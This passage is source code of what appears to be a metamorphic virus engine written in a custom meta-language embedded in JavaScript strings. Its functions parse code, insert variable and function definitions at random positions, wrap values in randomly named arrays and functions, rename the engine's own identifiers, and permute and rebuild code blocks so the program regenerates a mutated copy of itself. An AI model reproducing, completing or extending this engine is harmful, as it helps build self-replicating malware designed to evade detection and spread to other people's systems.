        MetaLevelLanguage+='__(CBCB400|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n4n#)1O#1x#!#x2#"var "#2x#?==)004';    
            MetaLevelLanguage+='__(CBCC200|)c+s(°+CBCRString+°,#x1fCreateExecution(#x2°+CBCSingleElement+°2x#,#n1n#)1x#)';
            MetaLevelLanguage+='__(CBCC300|CBCC200)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';                                             
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';  
        MetaLevelLanguage+='__(CBCB410|)000';
        MetaLevelLanguage+='__(CBCB620|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n7n#)1O#1x#!#x2#"victory"#2x#?==)011'; 
            MetaLevelLanguage+='__(CBCC100|)if(#x1fGiveRandomNumber(#n2n#)1x#!#n0n#?>)002';
                MetaLevelLanguage+='__(CBCD100|)c+s(°+CBCRString+°,#x1#"va"#1x#)';
                MetaLevelLanguage+='__(CBCD200|CBCD100)c+s(°+CBCRString+°,#x1#"r "#1x#)';                              
            MetaLevelLanguage+='__(CBCC101|)000';
            MetaLevelLanguage+='__(CBCC111|)xDoIWriteMetaCode=#n1n#';                 
            MetaLevelLanguage+='__(CBCC200|CBCC100)c+s(°+CBCRString+°,#x1#O1°+CBCSingleElement+°.substring(#n8n#)1O#1x#)';                                               
            MetaLevelLanguage+='__(CBCC250|CBCC111,CBCC200)c+s(°+CBCRString+°,#x1fCreateString(#x2°+OriginalMetaCode+°2x#)1x#)';    
            MetaLevelLanguage+='__(CBCC300|CBCC250)c+s(°+CBCRString+°,#x1fGiveMeString(#n64n#)1x#)';
            MetaLevelLanguage+='__(CBCC400|CBCC300)c+s(°+CBCRString+°,#x1fGiveMeString(#n59n#)1x#)';
            MetaLevelLanguage+='__(CBCC700|CBCC400)c+1(°+CBCCodeLineIndex+°)';     
            MetaLevelLanguage+='__(CBCC710|CBCC250)xDoIWriteMetaCode=#n0n#';                                        
        MetaLevelLanguage+='__(CBCB630|)000';          
        MetaLevelLanguage+='__(CBCB500|CBCA500)if(#x1#O1°+CBCSingleElement+°#.substring(#n0n#,#n9n#)1O#1x#!#x2#"function "#2x#?==)009';    
            MetaLevelLanguage+='__(CBCC100|)var CBCfunctionname=#x1#O1°+CBCSingleElement+°#.substring(#n9n#,#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n40n#)3x#)2x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC200|)var CBCfunctionarguments=#x1#O1°+CBCSingleElement+°#.substring(#x2°+CBCSingleElement+°.indexOf(#x3fGiveMeString(#n40n#)3x#)2x#,#x4#x5°+CBCSingleElement+°.indexOf(#x6fGiveMeString(#n41n#)6x#)5x#+#n1n#4x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC300|)var CBCNumOfFFElementsCode=#x1parseInt(#x2#O1°+CBCSingleElement+°#.substring(#x3°+CBCSingleElement+°.indexOf(")")+#n1n#3x#)1O#2x#,#x4#n10n#4x#)1x#';
            MetaLevelLanguage+='__(CBCC400|CBCC300)var CBCExecuteCode=#x1#O1°+argCodeBlockArray+°#.slice(#x2°+CBCCodeLineIndex+° +#n1n#2x#,#x3#x4°+CBCCodeLineIndex+°4x# + #x5°+CBCNumOfFFElementsCode+°5x# +#n1n#3x#)1O#1x#';
            MetaLevelLanguage+='__(CBCC500|CBCC400)ysFunctionDefs.push(#x1fCreateBlockOfCode(#x2°+CBCExecuteCode+°2x#)1x#)';
            MetaLevelLanguage+='__(CBCC600|CBCC200,CBCC500)ysFunctionArgs.push(#x1°+CBCfunctionarguments+°1x#)';
            MetaLevelLanguage+='__(CBCC700|CBCC100,CBCC500)ysFunctionNames.push(#x1°+CBCfunctionname+°1x#)';          
            MetaLevelLanguage+='__(CBCC800|CBCC400)c+n(°+CBCCodeLineIndex+°,#x1°+CBCNumOfFFElementsCode+°1x#)';
            MetaLevelLanguage+='__(CBCC900|CBCC400)c+1(°+CBCCodeLineIndex+°)';
        MetaLevelLanguage+='__(CBCB510|)000';
    MetaLevelLanguage+='__(CBC0700|CBC0600)c-1(sHierarchyOfCalls)';
    MetaLevelLanguage+='__(CBC0800|CBC0600)yCBCLocalVarName.reverse()';
    MetaLevelLanguage+='__(CBC0900|CBC0600)yCBCLocalVarDefs.reverse()';
    MetaLevelLanguage+='__(CBC1000|CBC0800,CBC0900)while($#x1°+CBCLocalVarName+°.length1x#!#x2#n0n#2x#?>@)007'
        MetaLevelLanguage+='__(CBC0100|)var CBCFirstPos=#x1#O1°+CBCRString+°#.indexOf(#x2°+CBCLocalVarName+°[#n0n#]2x#)1O#1x#';
        MetaLevelLanguage+='__(CBC0200|CBC0100)var CBCPotentialPos=#x1fFindPositionForCode(#x2°+CBCRString+°2x#,#x3°+CBCFirstPos+°3x#)1x#';
        MetaLevelLanguage+='__(CBC0300|)var CodeVarIntegrate=#x1#x2#"var "#2x#+ #x3°+CBCLocalVarName+°[#n0n#]3x# +#x4#"="#4x#+ #x5°+CBCLocalVarDefs+°[#n0n#]5x#+#x6fGiveMeString(#n64n#)6x#+#x7fGiveMeString(#n59n#)7x#1x#';
        MetaLevelLanguage+='__(CBC0400|CBC0300)yCBCLocalVarName.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CBC0500|CBC0300)yCBCLocalVarDefs.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CBC0600|CBC0200)var NewVarPos=#x1°+CBCPotentialPos+°[#x2fGiveRandomNumber(#x3#O1°+CBCPotentialPos+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CBC0700|CBC0300,CBC0400,CBC0500,CBC0600)y°+CBCRString+°=#x1#x2#O1°+CBCRString+°#.substring(0,°+NewVarPos+°)1O#2x#+ #x3°+CodeVarIntegrate+°3x# + #x4°+CBCRString+°.substring(#x5°+NewVarPos+°5x#)4x#1x#';
    MetaLevelLanguage+='__(CBC1100|CBC0700,CBC1000)if(#x1sHierarchyOfCalls1x#!#x2#n0n#2x#?!=)004'
        MetaLevelLanguage+='__(CBC0100|)while($#x1#O1°+CBCRString+°#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#)1O#1x#!#x5#n-1n#5x#?!=@)001'
            MetaLevelLanguage+='__(CBCA100|)y°+CBCRString+°=#x1#O1°+CBCRString+°#.replace(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#,fGiveMeString(#n59n#))1O#1x#'
        MetaLevelLanguage+='__(CBC0200|CBC0100)while($#x1#O1°+CBCRString+°#.indexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#)1O#1x#!#x3#n-1n#3x#?!=@)001';
            MetaLevelLanguage+='__(CBCA100|)y°+CBCRString+°=#x1#O1°+CBCRString+°#.replace(#x2fGiveMeString(#n64n#)2x#,#x3#""#3x#)1O#1x#'
    MetaLevelLanguage+='__(CBC1200|)000';            
    MetaLevelLanguage+='__(CBC1300|CBC1100)xreturn(#x1°+CBCRString+°1x#)';
    

MetaLevelLanguage+='__(2100|)function fCalculateFirstAppearance(CFAOriginalCode,CFAObjectName)011';
    MetaLevelLanguage+='__(CFA010|)var CFAObjectPlace=#x1#O1°+CFAOriginalCode+°#.indexOf(#x2°+CFAObjectName+°2x#)1O#1x#';
    MetaLevelLanguage+='__(CFA020|CFA010)if(#x1°+CFAObjectPlace+°1x#!#x2#n-1n#2x#?==)007';
        MetaLevelLanguage+='__(CFAx10|)var CFAGetFunctionN=#x1#n-1n#1x#';
        MetaLevelLanguage+='__(CFAx20|CFAx10)while(var CFAn=#n0n#$#x1°+CFAn+°1x#!#x2#O1sFunctionVariableNameArray#.length1O#2x#?<@°+CFAn+°=°+CFAn+° +#n1n#)004';
            MetaLevelLanguage+='__(CFAy10|)while(var CFAm=#n0n#$#x1°+CFAm+°1x#!#x2#O1sFunctionVariableNameArray[#x3°+CFAn+°3x#]#.length1O#2x#?<@°+CFAm+°=°+CFAm+° +#n1n#)003';
                MetaLevelLanguage+='__(CFAz10|)if(#x1sFunctionVariableNameArray[#x2°+CFAn+°2x#][#x3°+CFAm+°3x#]1x#!#x4°+CFAObjectName+°4x#?==)001';
                    MetaLevelLanguage+='__(CFAw10|)y°+CFAGetFunctionN+°=#x1°+CFAn+°1x#';
                MetaLevelLanguage+='__(CFAz20|)000';
        MetaLevelLanguage+='__(CFAx30|CFAx20)y°+CFAObjectPlace+°=#x1#O1°+CFAOriginalCode+°#.indexOf(#x2sFunctionVariableFctName[#x3°+CFAGetFunctionN+°3x#]2x#)1O#1x#';
    MetaLevelLanguage+='__(CFA030|)000';
    MetaLevelLanguage+='__(CFA040|CFA020)xreturn(#x1°+CFAObjectPlace+°1x#)';


MetaLevelLanguage+='__(2200|)function fFindPositionForCode(FPFOriginalCode,FPFPosTrace)028';
    MetaLevelLanguage+='__(FPF010|)var FPFVPosArray=#x1[]1x#';                    
    MetaLevelLanguage+='__(FPF020|)var FPFSKPlace=#x1#n0n#1x#';
    MetaLevelLanguage+='__(FPF030|FPF010,FPF020)while($#x1°+FPFSKPlace+°1x#!#x2#n-1n#2x#?!=@)023';
        MetaLevelLanguage+='__(FPFa010|)var FPFSKPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n59n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa020|)var FPFBraPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n123n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa030|)var FPFKetPlace=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n125n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa040|FPFa010,FPFa020,FPFa030)y°+FPFPosTrace+°=#x1#O1Math#.max(#x2°+FPFSKPlace+°2x#,#x3°+FPFBraPlace+°3x#,#x4°+FPFKetPlace+°4x#)1O#1x#';
        MetaLevelLanguage+='__(FPFa050|FPFa040)if(#x1°+FPFPosTrace+°1x#!#x2°+FPFSKPlace+°2x#?==)003';
            MetaLevelLanguage+='__(FPFb010|)if(#x1°+FPFSKPlace+°1x#!#x2#n-1n#2x#?!=)001';
                MetaLevelLanguage+='__(FPFc010|)y°+FPFVPosArray+°.push(#x2#x1°+FPFSKPlace+°1x# +#n2n#2x#)';
            MetaLevelLanguage+='__(FPFb020|)000';
        MetaLevelLanguage+='__(FPFa060|)000';
        MetaLevelLanguage+='__(FPFa070|FPFa050)if(#x1°+FPFPosTrace+°1x#!#x2°+FPFKetPlace+°2x#?==)012';
            MetaLevelLanguage+='__(FPFb010|)if(#x1°+FPFPosTrace+°1x#!#x2#n-1n#2x#?!=)010';
                MetaLevelLanguage+='__(FPFc010|)var FPFFoundKet=#x1#n1n#1x#';
                MetaLevelLanguage+='__(FPFc020|FPFc010)while($#x1°+FPFFoundKet+°1x#!#x2#n0n#2x#?>@)008';
                    MetaLevelLanguage+='__(FPFd010|)y°+FPFBraPlace+°=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n123n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
                    MetaLevelLanguage+='__(FPFd020|)y°+FPFKetPlace+°=#x1#O1°+FPFOriginalCode+°#.lastIndexOf(#x2fGiveMeString(#n64n#)+fGiveMeString(#n125n#)2x#,#x3°+FPFPosTrace+°-#n1n#3x#)1O#1x#';
                    MetaLevelLanguage+='__(FPFd030|FPFd010,FPFd020)if(#x1°+FPFBraPlace+°1x#!#x2°+FPFKetPlace+°2x#?>)002';
                        MetaLevelLanguage+='__(FPFe010|)c-1(°+FPFFoundKet+°)';
                        MetaLevelLanguage+='__(FPFe020|)y°+FPFPosTrace+°=#x1°+FPFBraPlace+°1x#';
                    MetaLevelLanguage+='__(FPFd030|)002';
                        MetaLevelLanguage+='__(FPFe010|)c+1(°+FPFFoundKet+°)'; 
                        MetaLevelLanguage+='__(FPFe020|)y°+FPFPosTrace+°=#x1°+FPFKetPlace+°1x#';
            MetaLevelLanguage+='__(FPFb020|)000';  
        MetaLevelLanguage+='__(FPFa080|)000';                                  
    MetaLevelLanguage+='__(FPF040|FPF030)y°+FPFVPosArray+°.push(#x1#n0n#1x#)';
    MetaLevelLanguage+='__(FPF050|FPF040)xreturn(#x1°+FPFVPosArray+°1x#)';
                
            

MetaLevelLanguage+='__(2300|)function fCreateVarsAndFuncts(CVFOriginalCode)058';
    MetaLevelLanguage+='__(CVF0000|)var CVFTmpVarNames=#x1sVarNames.slice()1x#'; 
    MetaLevelLanguage+='__(CVF0100|CVF0010,CVF0000)while($#x1#O1sVarDefs#.length1O#1x#!#x2#n0n#2x#?>@)007';
        MetaLevelLanguage+='__(CVFa000|)var CVFNextPlace=#x1fCalculateFirstAppearance(#x2°+CVFOriginalCode+°2x#,#x3sVarNames[#n0n#]3x#)1x#';
        MetaLevelLanguage+='__(CVFa010|)var CVFCToIntegrate=#x1#x2sVarNames[#n0n#]2x#+#x3"="3x#+#x4sVarDefs[#n0n#]4x#+#x5fGiveMeString(#n64n#)5x#+#x6fGiveMeString(#n59n#)6x#1x#';
        MetaLevelLanguage+='__(CVFa020|CVFa010)ysVarDefs.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CVFa030|CVFa000,CVFa010)ysVarNames.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CVFa040|CVFa000)var CVFVariablePosArray=#x1fFindPositionForCode(#x2°+CVFOriginalCode+°2x#,#x3°+CVFNextPlace+°3x#)1x#';
        MetaLevelLanguage+='__(CVFa050|CVFa040)var CVFNewPos=#x1°+CVFVariablePosArray+°[#x2fGiveRandomNumber(#x3#O1°+CVFVariablePosArray+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CVFa060|CVFa010,CVFa050)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.substring(#n0n#,#x2°+CVFNewPos+°2x#)1O#+ #x3°+CVFCToIntegrate+°3x# + #x4#O2°+CVFOriginalCode+°#.substring(#x5°+CVFNewPos+°5x#)2O#4x#1x#';      
    MetaLevelLanguage+='__(CVF0200|CVF0000)var CVFNumberOfArrays=#x1fGiveRandomNumber(#x2#O1°+CVFTmpVarNames+°#.length1O#/#n10n#2x#)1x#';
    MetaLevelLanguage+='__(CVF0300|CVF0210,CVF0100,CVF0200)while(var CVFindexk=#n0n#$#x1°+CVFindexk+°1x#!#x2°+CVFNumberOfArrays+°2x#?<@°+CVFindexk+°=°+CVFindexk+° +#n1n#)042';
        MetaLevelLanguage+='__(CVFa010|)var CVFRandNameArr=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(CVFa020|)yCVFTmpVarNames=#x1#O1°+CVFTmpVarNames+°#.sort(#x2fRandomizeFunction2x#)1O#1x#';
        MetaLevelLanguage+='__(CVFa030|)var CVFNumberOfArrayEntries=#x1fGiveRandomNumber(#x2#O1°+CVFTmpVarNames+°#.length1O#/#n3n#2x#)1x#';
        MetaLevelLanguage+='__(CVFa040|CVFa010)var CVFCodeToIntegrate=#x1°+CVFRandNameArr+°1x#';
        MetaLevelLanguage+='__(CVFa050|CVFa040)c+s(°+CVFCodeToIntegrate+°,#x1"=["1x#)';      
        MetaLevelLanguage+='__(CVFa060|)var CVFArrayIndexCounter=#x1#n0n#1x#';
        MetaLevelLanguage+='__(CVFa070|CVFa020,CVFa030,CVFa050,CVFa060)while(var CVFcounti=#n0n#$#x1°+CVFcounti+°1x#!#x2°+CVFNumberOfArrayEntries+°2x#?<@°+CVFcounti+°=°+CVFcounti+° +#n1n#)033';
            MetaLevelLanguage+='__(CVFb010|)var CVFSearchArrayEntries1=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#)1O#1x#';
            MetaLevelLanguage+='__(CVFb020|CVFb010)if(#x1°+CVFSearchArrayEntries1+°1x#!#x2#n-1n#2x#?!=)030'; 
                MetaLevelLanguage+='__(CVFc010|)var CVFSearchArrayEntries2=°+CVFOriginalCode+°.indexOf(°+CVFTmpVarNames+°[°+CVFcounti+°],°+CVFSearchArrayEntries1+° +1)';                
                MetaLevelLanguage+='__(CVFc020|CVFc010)if(#x1°+CVFSearchArrayEntries2+°1x#!#x2#n-1n#2x#?!=)027';
                    MetaLevelLanguage+='__(CVFd010|)var CVFSearchArrayEntries3=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#,#x5#x4°+CVFSearchArrayEntries2+°4x# +#n1n#5x#)1O#1x#';
                    MetaLevelLanguage+='__(CVFd020|CVFd010)if(#x1°+CVFSearchArrayEntries3+°1x#!#x2#n-1n#2x#?==)024';
                        MetaLevelLanguage+='__(CVFe010|)var CVFSearchArrayEntries4=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2#x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]3x#+#"="#2x#)1O#1x#';
                        MetaLevelLanguage+='__(CVFe020|CVFe010)var CVFVariableDefinition=#x1#O1°+CVFOriginalCode+°#.substring(#x2°+CVFSearchArrayEntries4+°2x# + #x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#].length+#n1n#3x#,#x5°+CVFOriginalCode+°.indexOf(#x6fGiveMeString(#n64n#)+fGiveMeString(#n59n#)6x#,#x7°+CVFSearchArrayEntries4+°7x#)5x#)1O#1x#';                        
                        MetaLevelLanguage+='__(CVFe030|CVFe020)if(#x1fGiveRandomNumber(#n4n#)1x#!#n3n#?<)014';
                            MetaLevelLanguage+='__(CVFf010|)c+s(°+CVFCodeToIntegrate+°,#x1#"funct"#1x#)';
                            MetaLevelLanguage+='__(CVFf020|CVFf010)c+s(°+CVFCodeToIntegrate+°,#x1#"ion(){retu"#1x#)';
                            MetaLevelLanguage+='__(CVFf030|CVFf020)c+s(°+CVFCodeToIntegrate+°,#x1#"rn "#1x#)';         
                            MetaLevelLanguage+='__(CVFf040|CVFf030)c+s(°+CVFCodeToIntegrate+°,#x1°+CVFVariableDefinition+°1x#)';    
                            MetaLevelLanguage+='__(CVFf050|CVFf040)c+s(°+CVFCodeToIntegrate+°,#x1fGiveMeString(#n59n#)+fGiveMeString(#n125n#)+fGiveMeString(#n44n#)1x#)';  
                            MetaLevelLanguage+='__(CVFf060|)var CVFOldMarker=#x1#O1°+CVFOriginalCode+°#.search(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n88n#)4x#+#x5fGiveMeString(#n64n#)5x#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf070|CVFf060)var CVFRes1=#x1(#x2°+CVFOldMarker+°2x#>#x3°+CVFSearchArrayEntries4+°3x#||#x4°+CVFOldMarker+°4x#==#x5#n-1n#5x#)1x#';                            
                            MetaLevelLanguage+='__(CVFf080|CVFf070)if(#x1°+CVFRes1+°1x#!#x2true2x#?==)002';
                                MetaLevelLanguage+='__(CVFg010|)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n88n#)4x#+#x5fGiveMeString(#n64n#)5x#2x#,#""#)1O#1x#';
                                MetaLevelLanguage+='__(CVFg020|CVFg010)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#+#x4fGiveMeString(#n61n#)4x#+ #x5°+CVFVariableDefinition+°5x# +#x6fGiveMeString(#n64n#)+fGiveMeString(#n59n#)6x#,#x7fGiveMeString(#n64n#)+fGiveMeString(#n88n#)+fGiveMeString(#n64n#)7x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf090|)001';
                                MetaLevelLanguage+='__(CVFg010|)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]+#x5fGiveMeString(#n61n#)5x#+ #x6°+CVFVariableDefinition+°6x# +#x7fGiveMeString(#n64n#)+fGiveMeString(#n59n#)7x#2x#,#x3#""#3x#)1O#1x#';                                
                            MetaLevelLanguage+='__(CVFf100|CVFf080)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]2x#,#x2#x3°+CVFRandNameArr+°3x# +#x5fGiveMeString(#n91n#)5x#+ #x6°+CVFArrayIndexCounter+°6x# +#x7fGiveMeString(#n93n#)+fGiveMeString(#n40n#)+fGiveMeString(#n41n#)7x#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf110|CVFf100)c+1(°+CVFArrayIndexCounter+°)';
                        MetaLevelLanguage+='__(CVFe040|)006';
                            MetaLevelLanguage+='__(CVFf010|)var CVFRandFuncName=#x1fGiveRandomString()1x#';
                            MetaLevelLanguage+='__(CVFf020|CVFf010)ysFunctionNames.push(#x1°+CVFRandFuncName+°1x#)';
                            MetaLevelLanguage+='__(CVFf030|)ysFunctionDefs.push(#x1#x2#"ret"#2x#+#x3#"urn "#3x#+ #x4°+CVFVariableDefinition+°4x#1x#)';
                            MetaLevelLanguage+='__(CVFf040|)ysFunctionArgs.push(#x1#x2fGiveMeString(#n40n#)2x#+#x3fGiveMeString(#n41n#)3x#1x#)';
                            MetaLevelLanguage+='__(CVFf050|CVFf010)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]3x#+#x5"="5x#+ #x6°+CVFVariableDefinition+°6x# +#x7#x8fGiveMeString(#n64n#)8x#+#x9fGiveMeString(#n59n#)9x#7x#,#x2#""#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf060|CVFf050)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#,#x7#x4°+CVFRandFuncName+°4x# +#x5fGiveMeString(#n40n#)5x#+#x6fGiveMeString(#n41n#)6x#7x#)1O#1x#';                  
                    MetaLevelLanguage+='__(CVFd030|)000';
                MetaLevelLanguage+='__(CVFc030|)000';
            MetaLevelLanguage+='__(CVFb030|)000';        
        MetaLevelLanguage+='__(CVFa080|CVFa070)y°+CVFCodeToIntegrate+°=#x1#O1°+CVFCodeToIntegrate+°#.substring(#n0n#,#x2°+CVFCodeToIntegrate+°.length-#n1n#2x#)1O#+#"];"#1x#';       
        MetaLevelLanguage+='__(CVFa090|CVFa080)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2fGiveMeString(#n64n#)+fGiveMeString(#n88n#)+fGiveMeString(#n64n#)2x#,#x3°+CVFCodeToIntegrate+°3x#)1O#1x#'; 
    MetaLevelLanguage+='__(CVF0400|CVF0310,CVF0300)while(var CVFcountj=#n0n#$#x1°+CVFcountj+°1x#!#x2#O1sFunctionDefs#.length1O#2x#?<@°+CVFcountj+°=°+CVFcountj+° +#n1n#)003';    
        MetaLevelLanguage+='__(CVFa100|)var CVFPositionForIntegration=#x1fFindPositionForCode(#x2°+CVFOriginalCode+°2x#,#x3Infinity3x#)1x#';
        MetaLevelLanguage+='__(CVFa200|CVFa100)var CVFIntegrationPosition=#x1°+CVFPositionForIntegration+°[#x2fGiveRandomNumber(#x3#O1°+CVFPositionForIntegration+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CVFa300|CVFa200)y°+CVFOriginalCode+°=#x1#x2°+CVFOriginalCode+°.substring(#n0n#,#x3°+CVFIntegrationPosition+°3x#)2x#+#x4#"func"#4x#+#"tion "#+#x6sFunctionNames[°+CVFcountj+°]6x#+#x7sFunctionArgs[°+CVFcountj+°]7x#+#x8fGiveMeString(#n64n#)+fGiveMeString(#n123n#)8x#+#x9sFunctionDefs[°+CVFcountj+°]+fGiveMeString(#n64n#)+fGiveMeString(#n125n#)+ #x5°+CVFOriginalCode+°.substring(°+CVFIntegrationPosition+°)5x#9x#1x#';
    MetaLevelLanguage+='__(CVF0500|CVF0400)xreturn(#x1°+CVFOriginalCode+°1x#)';                    
            
            
MetaLevelLanguage+='__(vvvic|MetaDef)victory:sMetaLevelLanguage=';
MetaLevelLanguage+='__(orgv|vvvic)def OriginalMetaCode=#x1sMetaLevelLanguage1x#';
MetaLevelLanguage+='__(o010|orgv)while($#x1#O1°+sMetaLevelLanguage+°#.indexOf(#x2fGiveMeString(#n58n#)+fGiveMeString(#n45n#)+fGiveMeString(#n41n#)2x#)1O#1x#!#n-1n#?!=@)002';
    MetaLevelLanguage+='__(o011|)y°+sMetaLevelLanguage+°=#x1#O1°+sMetaLevelLanguage+°#.replace(#x2fGiveMeString(#n58n#)+fGiveMeString(#n45n#)+fGiveMeString(#n41n#)2x#,#x3fGiveMeString(#n43n#)+fGiveMeString(#n176n#)3x#)1O#1x#';
    MetaLevelLanguage+='__(o012|)y°+sMetaLevelLanguage+°=#x1#O1°+sMetaLevelLanguage+°#.replace(#x2fGiveMeString(#n40n#)+fGiveMeString(#n45n#)+fGiveMeString(#n58n#)2x#,#x3fGiveMeString(#n176n#)+fGiveMeString(#n43n#)3x#)1O#1x#';    
MetaLevelLanguage+='__(2440|o010)def RndMetaName=#x1fGiveRandomString()1x#';
MetaLevelLanguage+='__(2450|o010,2440)while($#x1#O1sMetaLevelLanguage#.indexOf(#x3#"sMetaLevelLanguage"#3x#)1O#1x#!#x2#n-1n#2x#?!=@)001';
    MetaLevelLanguage+='__(001|)xsMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2#"sMetaLevelLanguage"#2x#,#x3RndMetaName3x#)1O#1x#';
MetaLevelLanguage+='__(2400|2450,o010,PC1000,PC0800,VDef001,VDef002,VDef003,VDef004,VDef005,VDef006,VDef007,VDef008,VDef009,VDef010,VDef011,VDef012,VDef014)def sFullCodeArray=#x1#O1sMetaLevelLanguage#.split(#x2#x3fGiveMeString(#n95n#)3x#+#x4fGiveMeString(#n95n#)4x#2x#)1O#1x#';
MetaLevelLanguage+='__(2500|2400)def sPermCodeArray=#x1fPermutator(#x2#O1sFullCodeArray#.slice()1O#2x#)1x#';
MetaLevelLanguage+='__(2600|PC0800,PC1000,PC1100,VDef015,2500)def sNewCode=#x1fCreateBlockOfCode(#x2sPermCodeArray2x#)1x#';
MetaLevelLanguage+='__(2700|2600)ysFunctionNames.reverse()';
MetaLevelLanguage+='__(2800|2600)ysFunctionDefs.reverse()';
MetaLevelLanguage+='__(2900|2600)ysFunctionArgs.reverse()';
MetaLevelLanguage+='__(3000|2600)ysVarDefs.reverse()';
MetaLevelLanguage+='__(3100|2600)ysVarNames.reverse()';
MetaLevelLanguage+='__(3200|2700,2800,2900,3000,3100)def sFinalCode=#x1fCreateVarsAndFuncts(#x2sNewCode2x#)1x#';
MetaLevelLanguage+='__(3300|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n123n#)5x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x5#x2fGiveMeString(#n33n#)2x#+#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#5x#,#x6#""#6x#)1O#1x#';
MetaLevelLanguage+='__(3400|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n125n#)5x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n125n#)5x#2x#,#x6#""#6x#)1O#1x#';
MetaLevelLanguage+='__(3500|3300)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#2x#,#x5fGiveMeString(#n123n#)5x#)1O#1x#';
MetaLevelLanguage+='__(3600|3400)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n125n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n125n#)4x#2x#,#x5fGiveMeString(#n125n#)5x#)1O#1x#';
MetaLevelLanguage+='__(3700|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
